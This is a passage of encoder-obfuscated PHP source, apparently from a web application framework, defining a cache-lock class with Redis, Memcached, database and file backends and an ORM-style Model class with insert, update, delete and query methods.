$»Î•Ğû²[21] && $ååáş—é == $»Î•Ğû²[13]) { $¬¯Ş´©Â = $»Î•Ğû²[231]; } switch ($¬¯Ş´©Â) { case $»Î•Ğû²[930]: self::$handle = new CacheLockRedis(); break; case $»Î•Ğû²[931]: self::$handle = new CacheLockMemcached(); break; case $»Î•Ğû²[21]: self::$handle = new CacheLockDatabase(); break; case $»Î•Ğû²[231]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($»Î•Ğû²[946], $»Î•Ğû²[947]); } return self::$handle; } private static function key($›£¹Ä˜Ö) { return $_SERVER[öæÛ¿©¿][948] . Cache::key($›£¹Ä˜Ö); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Ïœè”¹ü = '') { self::$errorMsg = $Ïœè”¹ü; } public static function lockGlobal($ĞÉºĞêï, $”“‹¿Ü) { return self::lock($ĞÉºĞêï, $”“‹¿Ü, !0); } public static function lock($¨ğíºƒß, $³“£·Ï = false, $©‰¼Ñ™º = false) { $ƒŒò¼úÔ =& $_SERVER[öæÛ¿©¿]; $ÈëÌ ½ = self::init(); $Šş¶ï°¢ = self::key($¨ğíºƒß); $³“£·Ï = $³“£·Ï ? $³“£·Ï : self::$timeout; $¦Ö¸¢ = timeFloat(); if (_get($GLOBALS, $ƒŒò¼úÔ[949], !1)) { if (!$ÈëÌ ½->lock($Šş¶ï°¢, 0.2)) { die; } return !0; } $ñ—ƒ•® = $ÈëÌ ½->lock($Šş¶ï°¢, $³“£·Ï); $ÁÚè¬™‚ = timeFloat(); if (!$ñ—ƒ•®) { $ğÓ€âşñ = "\154\157\143\x6b\x20\145\162\x72\x6f\162\73\x6b\145\x79\x3d{$¨ğíºƒß}\x3b\x74\x69\x6d\145\x3d{$³“£·Ï}\73" . self::$errorMsg . $ƒŒò¼úÔ[74] . get_caller_msg(); $ûéñ¢Ì = LNG($ƒŒò¼úÔ[950]) . "\x28{$³“£·Ï}\x73\x29\56" . LNG($ƒŒò¼úÔ[951]); $ûéñ¢Ì .= $ƒŒò¼úÔ[952]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ûéñ¢Ì = $ûéñ¢Ì . $ƒŒò¼úÔ[953] . self::$errorMsg; } write_log($ƒŒò¼úÔ[954] . sprintf($ƒŒò¼úÔ[955], timeFloat() - $¦Ö¸¢) . $ƒŒò¼úÔ[956] . $ğÓ€âşñ . $ƒŒò¼úÔ[957] . json_encode(error_get_last()), $ƒŒò¼úÔ[947]); show_json($ûéñ¢Ì, !1); } if (!$©‰¼Ñ™º) { self::$lockItem[$Šş¶ï°¢] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $â»Š¯ñ— = number_format(timeFloat() - $ÁÚè¬™‚, 3); write_log($ƒŒò¼úÔ[958] . $¨ğíºƒß . $ƒŒò¼úÔ[959] . $â»Š¯ñ—, $ƒŒò¼úÔ[947]); } return $ñ—ƒ•®; } public static function lockGet($–—›Œë‹) { $ÊäÂäÌ = self::key($–—›Œë‹); if (self::$lockItem[$ÊäÂäÌ]) { return self::$lockItem[$ÊäÂäÌ]; } return self::init()->lockGet($ÊäÂäÌ); } public static function unlock($×ú—ß‡¤) { $…º®ŒÁ¹ =& $_SERVER[öæÛ¿©¿]; $ˆ²ÎÇ‘‘ = self::key($×ú—ß‡¤); self::$lockItem[$ˆ²ÎÇ‘‘] = null; self::init()->unlock($ˆ²ÎÇ‘‘); if (GLOBAL_DEBUG_LOG_ALL) { write_log($…º®ŒÁ¹[960] . $×ú—ß‡¤, $…º®ŒÁ¹[947]); } return; } public static function unlockRuntime() { $¼Á‡‰Ë =& $_SERVER[öæÛ¿©¿]; $¡²¦¶¦Ø = self::init(); $½®¡åğÂ = !1; foreach (self::$lockItem as $±ˆ³‰êÑ => $ïõç©µ) { if (!$ïõç©µ) { continue; } $¡²¦¶¦Ø->unlock($±ˆ³‰êÑ); if (!$½®¡åğÂ) { $½®¡åğÂ = !0; write_log($¼Á‡‰Ë[961] . $±ˆ³‰êÑ . $¼Á‡‰Ë[74] . get_caller_msg(), $¼Á‡‰Ë[947]); continue; } write_log($¼Á‡‰Ë[961] . $±ˆ³‰êÑ, $¼Á‡‰Ë[947]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‡¡Óµ»š = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¼Á‡‰Ë[962] . $‡¡Óµ»š . $¼Á‡‰Ë[963] . ACTION, $¼Á‡‰Ë[947]); } } public static function fileLock($à…îšŒÜ) { $ÚãüÍÓ =& $_SERVER[öæÛ¿©¿]; if (!$GLOBALS[$ÚãüÍÓ[964]]) { $GLOBALS[$ÚãüÍÓ[964]] = array(); } $GLOBALS[$ÚãüÍÓ[964]][$à…îšŒÜ] = !1; $şñ†ğ”€ = fopen(DATA_PATH . $à…îšŒÜ . $ÚãüÍÓ[965], $ÚãüÍÓ[966]); if (!$şñ†ğ”€) { return !1; } $GLOBALS[$ÚãüÍÓ[964]][$à…îšŒÜ] = $şñ†ğ”€; if (flock($şñ†ğ”€, LOCK_EX)) { return !0; } self::unlock($à…îšŒÜ); show_json($ÚãüÍÓ[967], !1); return !1; } public static function fileUnlock($ÛËÊ¡–¢) { $À¡ù§å =& $_SERVER[öæÛ¿©¿]; $‹Ò“Ó© = $GLOBALS[$À¡ù§å[964]][$ÛËÊ¡–¢]; if (!$‹Ò“Ó©) { return; } $GLOBALS[$À¡ù§å[964]][$ÛËÊ¡–¢] = !1; flock($‹Ò“Ó©, LOCK_UN); fclose($‹Ò“Ó©); } public static function fileUnlockAll() { $êÉôİÖ¤ =& $_SERVER[öæÛ¿©¿]; if (!isset($GLOBALS[$êÉôİÖ¤[964]]) || !$GLOBALS[$êÉôİÖ¤[964]]) { return; } foreach ($GLOBALS[$êÉôİÖ¤[964]] as $¯«°úø† => $Ú¸ÙÎ±Â) { if (!$Ú¸ÙÎ±Â) { continue; } $GLOBALS[$êÉôİÖ¤[964]][$¯«°úø†] = !1; flock($Ú¸ÙÎ±Â, LOCK_UN); fclose($Ú¸ÙÎ±Â); } $GLOBALS[$êÉôİÖ¤[964]] = array(); } } goto F±®í°±ŸÙ; bßİâª‡¦·: define($_SERVER[öæÛ¿©¿][321], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\x65", "\x6f\162\144\145\x72", "\x61\x6c\x69\x61\163", "\x68\x61\x76\x69\x6e\x67", "\147\x72\x6f\165\x70", "\x6c\157\143\153", "\x64\x69\x73\164\151\156\143\x74", "\141\165\x74\157", "\146\151\154\164\145\162", "\x76\141\154\x69\x64\141\164\145", "\162\145\163\x75\154\164", "\x62\x69\156\x64", "\x74\157\153\x65\156"); public function __construct($Ù«İÍõä = '', $Ù®âà ± = '', $éğÓå²‘ = '') { $ÛùÑÁåŸ =& $_SERVER[öæÛ¿©¿]; $this->_initialize(); if (!empty($Ù«İÍõä)) { if (strpos($Ù«İÍõä, $ÛùÑÁåŸ[10])) { list($this->dbName, $this->name) = explode($ÛùÑÁåŸ[10], $Ù«İÍõä); } else { $this->name = $Ù«İÍõä; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ù®âà ±)) { $this->tablePrefix = $ÛùÑÁåŸ[12]; } elseif ($ÛùÑÁåŸ[12] != $Ù®âà ±) { $this->tablePrefix = $Ù®âà ±; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÛùÑÁåŸ[322]); } $this->db(0, empty($this->connection) ? $éğÓå²‘ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ßœ¬¢¢® =& $_SERVER[öæÛ¿©¿]; if (empty($this->fields)) { if (think_config($ßœ¬¢¢®[323])) { $ªª¯¾Û‡ = $this->dbName ? $this->dbName : think_config($ßœ¬¢¢®[324]); $”çÁµØ‡ = think_var_cache($ßœ¬¢¢®[325] . strtolower(get_path_this($ªª¯¾Û‡) . $ßœ¬¢¢®[10] . $this->name)); if ($”çÁµØ‡) { $Æ¢…ŞÑ÷ = think_config($ßœ¬¢¢®[326]); if (empty($Æ¢…ŞÑ÷) || $”çÁµØ‡[$ßœ¬¢¢®[327]] == $Æ¢…ŞÑ÷) { $this->fields = $”çÁµØ‡; return; } } } $this->flush(); } } public function flush() { $ğÆµµ =& $_SERVER[öæÛ¿©¿]; $this->db->setModel($this->name); $ßØĞò‹ = $this->db->getFields($this->getTableName()); if (!$ßØĞò‹) { return !1; } $this->fields = array_keys($ßØĞò‹); $this->fields[$ğÆµµ[328]] = !1; foreach ($ßØĞò‹ as $®ÔÄÌ¸í => $ÂœŒˆ‹è) { $œÄ–‚Ç•[$®ÔÄÌ¸í] = $ÂœŒˆ‹è[$ğÆµµ[33]]; if ($ÂœŒˆ‹è[$ğÆµµ[39]]) { $this->fields[$ğÆµµ[329]] = $®ÔÄÌ¸í; if ($ÂœŒˆ‹è[$ğÆµµ[42]]) { $this->fields[$ğÆµµ[328]] = !0; } } } $this->fields[$ğÆµµ[330]] = $œÄ–‚Ç•; if (think_config($ğÆµµ[326])) { $this->fields[$ğÆµµ[327]] = think_config($ğÆµµ[326]); } if (think_config($ğÆµµ[323])) { $òËöÓ¿ = $this->dbName ? $this->dbName : think_config($ğÆµµ[324]); think_var_cache($ğÆµµ[325] . strtolower(get_path_this($òËöÓ¿) . $ğÆµµ[10] . $this->name), $this->fields); } } public function switchModel($•ÃºŠÙÈ, $¥ïğÀ„Ì = array()) { $ÀŸĞ²­ =& $_SERVER[öæÛ¿©¿]; $É†êŠÁ = ucwords(strtolower($•ÃºŠÙÈ)) . $ÀŸĞ²­[331]; if (!class_exists($É†êŠÁ)) { think_exception($É†êŠÁ . think_lang($ÀŸĞ²­[332])); } $this->_extModel = new $É†êŠÁ($this->name); if (!empty($¥ïğÀ„Ì)) { foreach ($¥ïğÀ„Ì as $Äƒó¨™Ä) { $this->_extModel->setProperty($Äƒó¨™Ä, $this->{$Äƒó¨™Ä}); } } return $this->_extModel; } public function __set($ÉÆ‹¨, $Í£©ÊÈí) { $this->data[$ÉÆ‹¨] = $Í£©ÊÈí; } public function __get($‚¥Á³­ƒ) { return isset($this->data[$‚¥Á³­ƒ]) ? $this->data[$‚¥Á³­ƒ] : null; } public function __isset($·ìİ£ ) { return isset($this->data[$·ìİ£ ]); } public function __unset($¢Âª—ÀÌ) { unset($this->data[$¢Âª—ÀÌ]); } public function __call($”õ—¼È™, $öÍÄêİ ) { $å’Ò”õò =& $_SERVER[öæÛ¿©¿]; if (in_array(strtolower($”õ—¼È™), $this->methods, !0)) { $this->options[strtolower($”õ—¼È™)] = $öÍÄêİ [0]; return $this; } elseif (in_array(strtolower($”õ—¼È™), array($å’Ò”õò[333], $å’Ò”õò[334], $å’Ò”õò[335], $å’Ò”õò[336], $å’Ò”õò[337]), !0)) { $´ß‘ÏŠä = isset($öÍÄêİ [0]) ? $öÍÄêİ [0] : $å’Ò”õò[221]; $´ß‘ÏŠä = $this->db->parseKey($´ß‘ÏŠä); return $this->getField(strtoupper($”õ—¼È™) . $å’Ò”õò[338] . $´ß‘ÏŠä . $å’Ò”õò[339] . $”õ—¼È™, $å’Ò”õò[333]); } elseif (strtolower(substr($”õ—¼È™, 0, 5)) == $å’Ò”õò[340]) { $´ß‘ÏŠä = think_parse_name(substr($”õ—¼È™, 5)); $â¦ãû©Ÿ[$´ß‘ÏŠä] = $öÍÄêİ [0]; return $this->where($â¦ãû©Ÿ)->find(); } elseif (strtolower(substr($”õ—¼È™, 0, 10)) == $å’Ò”õò[341]) { $²ÎêßÊ = think_parse_name(substr($”õ—¼È™, 10)); $â¦ãû©Ÿ[$²ÎêßÊ] = $öÍÄêİ [0]; return $this->where($â¦ãû©Ÿ)->getField($öÍÄêİ [1]); } elseif (isset($this->_scope[$”õ—¼È™])) { return $this->scope($”õ—¼È™, $öÍÄêİ [0]); } elseif (method_exists($this, $”õ—¼È™) || method_exists($this, $å’Ò”õò[342] . $”õ—¼È™)) { array_unshift($öÍÄêİ , $”õ—¼È™); return call_user_func_array(array($this, $å’Ò”õò[343]), $öÍÄêİ ); } else { return call_user_func_array(array(parent, $”õ—¼È™), $öÍÄêİ ); } } protected function call() { $¹ó¤êüü =& $_SERVER[öæÛ¿©¿]; $ğ…Ñæ§ = func_get_args(); $í”¤½ğ× = array_shift($ğ…Ñæ§); $ÁÜ¾êºå = $í”¤½ğ×; if (is_array($í”¤½ğ×)) { $ÁÜ¾êºå = $í”¤½ğ×[1]; $í”¤½ğ× = $í”¤½ğ×[0]; } $ß¶Ô‘Öõ = count($ğ…Ñæ§) - 1; if (isset($ğ…Ñæ§[$ß¶Ô‘Öõ]) && $ğ…Ñæ§[$ß¶Ô‘Öõ] === $í”¤½ğ×) { think_exception(__CLASS__ . $¹ó¤êüü[4] . $í”¤½ğ× . think_lang($¹ó¤êüü[344])); return; } $ğ…Ñæ§[] = $í”¤½ğ×; if (method_exists($this, $¹ó¤êüü[345])) { $ıóßÌ‘¡ = call_user_func_array(array($this, $¹ó¤êüü[346]), array($ÁÜ¾êºå, $ğ…Ñæ§)); if (!is_null($ıóßÌ‘¡) && $ıóßÌ‘¡ !== !1) { return $ıóßÌ‘¡; } } $Õ•´÷ÖÜ = !1; if (method_exists($this, $í”¤½ğ×)) { $Õ•´÷ÖÜ = call_user_func_array(array($this, $í”¤½ğ×), $ğ…Ñæ§); } if (method_exists($this, $¹ó¤êüü[347])) { $ıóßÌ‘¡ = call_user_func_array(array($this, $¹ó¤êüü[348]), array($ÁÜ¾êºå, $ğ…Ñæ§, $Õ•´÷ÖÜ)); if ($ıóßÌ‘¡) { return $ıóßÌ‘¡; } } return $Õ•´÷ÖÜ; } protected function _initialize() { } protected function _facade($¨´›‚ûì) { $€Á¸øøµ =& $_SERVER[öæÛ¿©¿]; if (!empty($this->fields)) { foreach ($¨´›‚ûì as $ğ—ûÀ’ı => $¨´úæçĞ) { if (is_array($this->fields) && !in_array($ğ—ûÀ’ı, $this->fields, !0)) { unset($¨´›‚ûì[$ğ—ûÀ’ı]); } elseif (is_scalar($¨´úæçĞ)) { $this->_parseType($¨´›‚ûì, $ğ—ûÀ’ı); } } } if (!empty($this->options[$€Á¸øøµ[349]])) { $¨´›‚ûì = array_map($this->options[$€Á¸øøµ[349]], $¨´›‚ûì); unset($this->options[$€Á¸øøµ[349]]); } $this->_beforeWrite($¨´›‚ûì); return $¨´›‚ûì; } protected function _beforeWrite(&$¶°Üí³í) { } public function add($»Ìé¶æû = '', $ŒÀ…ÊœÂ = array(), $ğ¨¬Úò† = false) { if (empty($»Ìé¶æû)) { if (!empty($this->data)) { $»Ìé¶æû = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[öæÛ¿©¿][350]); return !1; } } $ŒÀ…ÊœÂ = $this->_parseOptions($ŒÀ…ÊœÂ); $»Ìé¶æû = $this->_facade($»Ìé¶æû); if (!1 === $this->_beforeInsert($»Ìé¶æû, $ŒÀ…ÊœÂ)) { return !1; } $¢Œ§“€£ = $this->db->insert($»Ìé¶æû, $ŒÀ…ÊœÂ, $ğ¨¬Úò†); if (!1 !== $¢Œ§“€£) { $æ°‘Ş¦¬ = $this->getLastInsID(); if ($æ°‘Ş¦¬) { $»Ìé¶æû[$this->getPk()] = $æ°‘Ş¦¬; $this->_after_insert($»Ìé¶æû, $ŒÀ…ÊœÂ); return $æ°‘Ş¦¬; } $this->_after_insert($»Ìé¶æû, $ŒÀ…ÊœÂ); } return $¢Œ§“€£; } protected function _beforeInsert(&$®¬›‡½æ, $”—“äêø) { } protected function _after_insert($¼æë™, $âÂö¬´ú) { } public function addAll($ñÖÃÖ†â, $êÛ¸¸·ò = array(), $ú²ê™»³ = false) { $ûÏ¬©× =& $_SERVER[öæÛ¿©¿]; if (empty($ñÖÃÖ†â)) { $this->error = think_lang($ûÏ¬©×[350]); return !1; } $êÛ¸¸·ò = $this->_parseOptions($êÛ¸¸·ò); foreach ($ñÖÃÖ†â as $ƒçËÃòµ => $û»ÇÕ) { $ñÖÃÖ†â[$ƒçËÃòµ] = $this->_facade($û»ÇÕ); } if (method_exists($this->db, $ûÏ¬©×[351])) { $Ñ­Âí‹ = $this->db->insertAll($ñÖÃÖ†â, $êÛ¸¸·ò, $ú²ê™»³); } else { $this->startTrans(); foreach ($ñÖÃÖ†â as $ƒçËÃòµ => $û»ÇÕ) { $Ñ­Âí‹ = $this->db->insert($û»ÇÕ, $êÛ¸¸·ò, $ú²ê™»³); } $this->commit(); } if (!1 !== $Ñ­Âí‹) { $Æ÷’Š¡Î = $this->getLastInsID(); if ($Æ÷’Š¡Î) { return $Æ÷’Š¡Î; } } return $Ñ­Âí‹; } public function selectAdd($ºÈìÀñ¸ = '', $ÅÚ†ıµ = '', $–ìø‘¥ = array()) { $ÇíŸÌèï =& $_SERVER[öæÛ¿©¿]; $–ìø‘¥ = $this->_parseOptions($–ìø‘¥); if (!1 === ($¿¬¨Ğ³í = $this->db->selectInsert($ºÈìÀñ¸ ? $ºÈìÀñ¸ : $–ìø‘¥[$ÇíŸÌèï[352]], $ÅÚ†ıµ ? $ÅÚ†ıµ : $this->getTableName(), $–ìø‘¥))) { $this->error = think_lang($ÇíŸÌèï[353]); return !1; } else { return $¿¬¨Ğ³í; } } public function save($àî³ˆú = '', $Ñ­ã†ñá = array()) { $˜ê»­ö¾ =& $_SERVER[öæÛ¿©¿]; if (empty($àî³ˆú)) { if (!empty($this->data)) { $àî³ˆú = $this->data; $this->data = array(); } else { $this->error = think_lang($˜ê»­ö¾[350]); return !1; } } $àî³ˆú = $this->_facade($àî³ˆú); $Ñ­ã†ñá = $this->_parseOptions($Ñ­ã†ñá); $©š¡ˆˆ = $this->getPk(); if (!isset($Ñ­ã†ñá[$˜ê»­ö¾[354]])) { if (isset($àî³ˆú[$©š¡ˆˆ])) { $ş«‚…‚ğ[$©š¡ˆˆ] = $àî³ˆú[$©š¡ˆˆ]; $Ñ­ã†ñá[$˜ê»­ö¾[354]] = $ş«‚…‚ğ; unset($àî³ˆú[$©š¡ˆˆ]); } else { $this->error = think_lang($˜ê»­ö¾[353]); return !1; } } if (is_array($Ñ­ã†ñá[$˜ê»­ö¾[354]]) && isset($Ñ­ã†ñá[$˜ê»­ö¾[354]][$©š¡ˆˆ])) { $¤µó€ËŠ = $Ñ­ã†ñá[$˜ê»­ö¾[354]][$©š¡ˆˆ]; } if (!1 === $this->_beforeUpdate($àî³ˆú, $Ñ­ã†ñá)) { return !1; } $×ˆîÑ½© = $this->db->update($àî³ˆú, $Ñ­ã†ñá); if (!1 !== $×ˆîÑ½©) { if (isset($¤µó€ËŠ)) { $àî³ˆú[$©š¡ˆˆ] = $¤µó€ËŠ; } $this->_afterUpdate($àî³ˆú, $Ñ­ã†ñá); } return $×ˆîÑ½©; } protected function _beforeUpdate(&$Ç©‘ûÛ¨, $×Ø¨Ü¥±) { } protected function _afterUpdate($ÈéˆÙÕğ, $µİ‘ÒÁ¯) { } public function delete($ÎŠ­ÅŒ = array()) { $Ñü²©ıü =& $_SERVER[öæÛ¿©¿]; if (empty($ÎŠ­ÅŒ) && empty($this->options[$Ñü²©ıü[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $‹ÒÄ‰à = $this->getPk(); if (is_numeric($ÎŠ­ÅŒ) || is_string($ÎŠ­ÅŒ)) { if (strpos($ÎŠ­ÅŒ, $Ñü²©ıü[50])) { $ıßÉ÷ş¾[$‹ÒÄ‰à] = array($Ñü²©ıü[355], $ÎŠ­ÅŒ); } else { $ıßÉ÷ş¾[$‹ÒÄ‰à] = $ÎŠ­ÅŒ; } $this->options[$Ñü²©ıü[354]] = $ıßÉ÷ş¾; } $ÎŠ­ÅŒ = $this->_parseOptions(); if (is_array($ÎŠ­ÅŒ[$Ñü²©ıü[354]]) && isset($ÎŠ­ÅŒ[$Ñü²©ıü[354]][$‹ÒÄ‰à])) { $ˆıçæŒø = $ÎŠ­ÅŒ[$Ñü²©ıü[354]][$‹ÒÄ‰à]; } $’£ö˜Ê¼ = $this->db->delete($ÎŠ­ÅŒ); if (!1 !== $’£ö˜Ê¼) { $·‚÷şê = array(); if (isset($ˆıçæŒø)) { $·‚÷şê[$‹ÒÄ‰à] = $ˆıçæŒø; } $this->_after_delete($·‚÷şê, $ÎŠ­ÅŒ); } return $’£ö˜Ê¼; } protected function _after_delete($Ã­™‚ÇØ, $ùßò) { } public function select($ã½ˆŒÁ = array()) { $à±÷Ò‹ =& $_SERVER[öæÛ¿©¿]; if (is_string($ã½ˆŒÁ) || is_numeric($ã½ˆŒÁ)) { $Œ®„½ = $this->getPk(); if (strpos($ã½ˆŒÁ, $à±÷Ò‹[50])) { $ùşàÀ²Í[$Œ®„½] = array($à±÷Ò‹[355], $ã½ˆŒÁ); } else { $ùşàÀ²Í[$Œ®„½] = $ã½ˆŒÁ; } $this->options[$à±÷Ò‹[354]] = $ùşàÀ²Í; } elseif (!1 === $ã½ˆŒÁ) { $ã½ˆŒÁ = $this->_parseOptions(); return $à±÷Ò‹[356] . $this->db->buildSelectSql($ã½ˆŒÁ) . $à±÷Ò‹[357]; } $ã½ˆŒÁ = $this->_parseOptions(); $ãÓô¦¹¦ = $this->db->select($ã½ˆŒÁ); if (!1 === $ãÓô¦¹¦) { return !1; } if (empty($ãÓô¦¹¦)) { return null; } $this->_afterSelect($ãÓô¦¹¦, $ã½ˆŒÁ); return $ãÓô¦¹¦; } protected function _afterSelect(&$çæ·Ÿ», $ñØÓÕÂŠ) { } public function buildSql($Ş ‡„³¢ = array()) { $‘ø›ò®“ =& $_SERVER[öæÛ¿©¿]; $Ş ‡„³¢ = $this->_parseOptions($Ş ‡„³¢); return $‘ø›ò®“[356] . $this->db->buildSelectSql($Ş ‡„³¢) . $‘ø›ò®“[357]; } public function optionsValue($æúÂ¹î = null) { if (is_null($æúÂ¹î)) { return $this->options; } elseif (is_array($æúÂ¹î)) { $this->options = array_merge($this->options, $æúÂ¹î); } } protected function _parseOptions($Îó»ÅÚ = array()) { $óòà¬¸ê =& $_SERVER[öæÛ¿©¿]; if (is_array($Îó»ÅÚ)) { $Îó»ÅÚ = array_merge($this->options, $Îó»ÅÚ); } $this->options = array(); if (!isset($Îó»ÅÚ[$óòà¬¸ê[358]])) { $Îó»ÅÚ[$óòà¬¸ê[358]] = $this->getTableName(); $™‰¥´ïµ = $this->fields; } else { $™‰¥´ïµ = $this->getDbFields(); } if (!empty($Îó»ÅÚ[$óòà¬¸ê[359]])) { $Îó»ÅÚ[$óòà¬¸ê[358]] .= $óòà¬¸ê[53] . $Îó»ÅÚ[$óòà¬¸ê[359]]; } $Îó»ÅÚ[$óòà¬¸ê[360]] = $this->name; if (isset($Îó»ÅÚ[$óòà¬¸ê[354]]) && is_array($Îó»ÅÚ[$óòà¬¸ê[354]]) && !empty($™‰¥´ïµ) && !isset($Îó»ÅÚ[$óòà¬¸ê[361]]) && !isset($Îó»ÅÚ[$óòà¬¸ê[358]])) { foreach ($Îó»ÅÚ[$óòà¬¸ê[354]] as $Ç™òïĞ˜ => $áƒÊ¶áÛ) { $Ç™òïĞ˜ = trim($Ç™òïĞ˜); if (in_array($Ç™òïĞ˜, $™‰¥´ïµ, !0)) { if (is_scalar($áƒÊ¶áÛ)) { $this->_parseType($Îó»ÅÚ[$óòà¬¸ê[354]], $Ç™òïĞ˜); } } elseif (!is_numeric($Ç™òïĞ˜) && $óòà¬¸ê[11] != substr($Ç™òïĞ˜, 0, 1) && !1 === strpos($Ç™òïĞ˜, $óòà¬¸ê[10]) && !1 === strpos($Ç™òïĞ˜, $óòà¬¸ê[338]) && !1 === strpos($Ç™òïĞ˜, $óòà¬¸ê[213]) && !1 === strpos($Ç™òïĞ˜, $óòà¬¸ê[285])) { unset($Îó»ÅÚ[$óòà¬¸ê[354]][$Ç™òïĞ˜]); } } } $this->_options_filter($Îó»ÅÚ); return $Îó»ÅÚ; } protected function _options_filter(&$»ÂŒç¸î) { } protected function _parseType(&$òˆè‹óí, $ÂÉ„ì‰Ë) { $š¶°™˜Å =& $_SERVER[öæÛ¿©¿]; if (empty($this->options[$š¶°™˜Å[362]][$š¶°™˜Å[4] . $ÂÉ„ì‰Ë])) { $ïµÒÄÒ¨ = strtolower($this->fields[$š¶°™˜Å[330]][$ÂÉ„ì‰Ë]); if (!1 !== strpos($ïµÒÄÒ¨, $š¶°™˜Å[363])) { } elseif (!1 === strpos($ïµÒÄÒ¨, $š¶°™˜Å[364]) && !1 !== strpos($ïµÒÄÒ¨, $š¶°™˜Å[365])) { $òˆè‹óí[$ÂÉ„ì‰Ë] = intval($òˆè‹óí[$ÂÉ„ì‰Ë]); } elseif (!1 !== strpos($ïµÒÄÒ¨, $š¶°™˜Å[366]) || !1 !== strpos($ïµÒÄÒ¨, $š¶°™˜Å[367])) { $òˆè‹óí[$ÂÉ„ì‰Ë] = floatval($òˆè‹óí[$ÂÉ„ì‰Ë]); } elseif (!1 !== strpos($ïµÒÄÒ¨, $š¶°™˜Å[368])) { $òˆè‹óí[$ÂÉ„ì‰Ë] = (bool) $òˆè‹óí[$ÂÉ„ì‰Ë]; } } } public function find($ı‘ô¦õ = array()) { $˜ ­„¥Ú =& $_SERVER[öæÛ¿©¿]; if (is_numeric($ı‘ô¦õ) || is_string($ı‘ô¦õ)) { $ç£ššŞû[$this->getPk()] = intval($ı‘ô¦õ); $this->options[$˜ ­„¥Ú[354]] = $ç£ššŞû; } $this->options[$˜ ­„¥Ú[369]] = 1; $ı‘ô¦õ = $this->_parseOptions(); $¤”ƒóòÙ = $this->db->select($ı‘ô¦õ); if (!1 === $¤”ƒóòÙ) { return !1; } if (empty($¤”ƒóòÙ)) { return null; } $ŞÑšŠĞ‚ = $¤”ƒóòÙ[0]; $this->_afterFind($ŞÑšŠĞ‚, $ı‘ô¦õ); return $ŞÑšŠĞ‚; } protected function _afterFind(&$ù‚ÍİÎş, $êºÍ£»˜) { } protected function returnResult($¹³Ç¨Óı, $µ×‹õ° = '') { $³ĞëË«î =& $_SERVER[öæÛ¿©¿]; if ($µ×‹õ°) { if (is_callable($µ×‹õ°)) { return call_user_func($µ×‹õ°, $¹³Ç¨Óı); } switch (strtolower($µ×‹õ°)) { case $³ĞëË«î[370]: return json_encode($¹³Ç¨Óı); case $³ĞëË«î[371]: return xml_encode($¹³Ç¨Óı); } } return $¹³Ç¨Óı; } public function parseFieldsMap($Ñ¾ô¤‹§, $û€¤ÉÅ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ĞÖÈŸØ‹ => $°°õğØ÷) { if ($û€¤ÉÅ == 1) { if (isset($Ñ¾ô¤‹§[$°°õğØ÷])) { $Ñ¾ô¤‹§[$ĞÖÈŸØ‹] = $Ñ¾ô¤‹§[$°°õğØ÷]; unset($Ñ¾ô¤‹§[$°°õğØ÷]); } } else { if (isset($Ñ¾ô¤‹§[$ĞÖÈŸØ‹])) { $Ñ¾ô¤‹§[$°°õğØ÷] = $Ñ¾ô¤‹§[$ĞÖÈŸØ‹]; unset($Ñ¾ô¤‹§[$ĞÖÈŸØ‹]); } } } } return $Ñ¾ô¤‹§; } public function setField($ÃÜŸŒœ, $şßêØÕ¥ = '') { if (is_array($ÃÜŸŒœ)) { $ œîÂó = $ÃÜŸŒœ; } else { $ œîÂó[$ÃÜŸŒœ] = $şßêØÕ¥; } return $this->save($ œîÂó); } public function setAdd($¹úßô, $¼ÉÖ©Ş = 1) { $ü¶üÍ =& $_SERVER[öæÛ¿©¿]; $íÀßÍªÈ = $¹úßô . $ü¶üÍ[372] . $¼ÉÖ©Ş; if ($¼ÉÖ©Ş < 0) { $íÀßÍªÈ = $¹úßô . $¼ÉÖ©Ş; } return $this->setField($¹úßô, array($ü¶üÍ[373], $íÀßÍªÈ)); } public function getField($ìğò¬à£, $ş±áìÌÑ = null) { $Ïë°ó°Ü =& $_SERVER[öæÛ¿©¿]; $Š‹ÔæŠó[$Ïë°ó°Ü[352]] = $ìğò¬à£; $Š‹ÔæŠó = $this->_parseOptions($Š‹ÔæŠó); $ìğò¬à£ = trim($ìğò¬à£); if (strpos($ìğò¬à£, $Ïë°ó°Ü[50])) { if (!isset($Š‹ÔæŠó[$Ïë°ó°Ü[369]])) { $Š‹ÔæŠó[$Ïë°ó°Ü[369]] = is_numeric($ş±áìÌÑ) ? $ş±áìÌÑ : $Ïë°ó°Ü[12]; } $ù»‰ïíË = $this->db->select($Š‹ÔæŠó); if (!empty($ù»‰ïíË)) { $ü¤Œ›å = explode($Ïë°ó°Ü[50], $ìğò¬à£); $ìğò¬à£ = array_keys($ù»‰ïíË[0]); $­¬Ñ½åë = array_shift($ìğò¬à£); $„ºáĞº” = array_shift($ìğò¬à£); $¢Óß’„ = array(); $èÍÁáª = count($ü¤Œ›å); foreach ($ù»‰ïíË as $“œĞ© ) { $ó Òíæñ = $“œĞ© [$­¬Ñ½åë]; if (2 == $èÍÁáª) { $¢Óß’„[$ó Òíæñ] = $“œĞ© [$„ºáĞº”]; } else { $¢Óß’„[$ó Òíæñ] = is_string($ş±áìÌÑ) ? implode($ş±áìÌÑ, $“œĞ© ) : $“œĞ© ; } } return $¢Óß’„; } } else { if (!0 !== $ş±áìÌÑ) { $Š‹ÔæŠó[$Ïë°ó°Ü[369]] = is_numeric($ş±áìÌÑ) ? 